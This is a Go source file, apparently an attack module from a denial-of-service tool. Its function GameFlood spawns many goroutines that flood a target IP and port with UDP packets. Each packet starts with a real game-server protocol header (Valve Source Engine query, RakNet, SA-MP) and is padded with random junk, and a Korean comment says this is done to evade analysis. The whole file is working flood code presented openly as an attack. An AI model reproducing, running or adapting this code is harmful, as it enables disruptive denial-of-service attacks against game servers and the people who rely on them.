package methods

import (
	"context"
	"fmt"
	"math/rand"
	"net"
	"runtime"
	"time"
)

// GameFlood - 실제 게임 프로토콜을 흉내 낸 강력한 타격
func GameFlood(ctx context.Context, IP, PORT string, SECONDS int) {
	fmt.Printf("[%s] GAME-DESTRUCTOR Attack started on %s:%s\n", time.Now().Format("15:04:05"), IP, PORT)

	addr := net.JoinHostPort(IP, PORT)
	numWorkers := runtime.NumCPU() * 64

	// 특수 게임 프로토콜 헤더 풀
	headers := [][]byte{
		[]byte("\xff\xff\xff\xffTSource Engine Query\x00"), // Valve
		[]byte("\x05\x00\x00\x00\x01"),                   // RakNet
		[]byte("\x09\x00\x00\x00\x00\x00\x00\x00\x00"),     // SAMP
	}

	for i := 0; i < numWorkers; i++ {
		go func() {
			conn, err := net.Dial("udp", addr)
			if err != nil { return }
			defer conn.Close()

			for {
				select {
				case <-ctx.Done():
					return
				default:
					header := headers[rand.Intn(len(headers))]
					junk := make([]byte, rand.Intn(512)+128)
					rand.Read(junk)
					
					// 헤더와 정크 데이터를 결합하여 분석 우회
					conn.Write(append(header, junk...))
				}
			}
		}()
	}

	<-ctx.Done()
	fmt.Printf("[%s] GAME-DESTRUCTOR Attack finished.\n", time.Now().Format("15:04:05"))
}
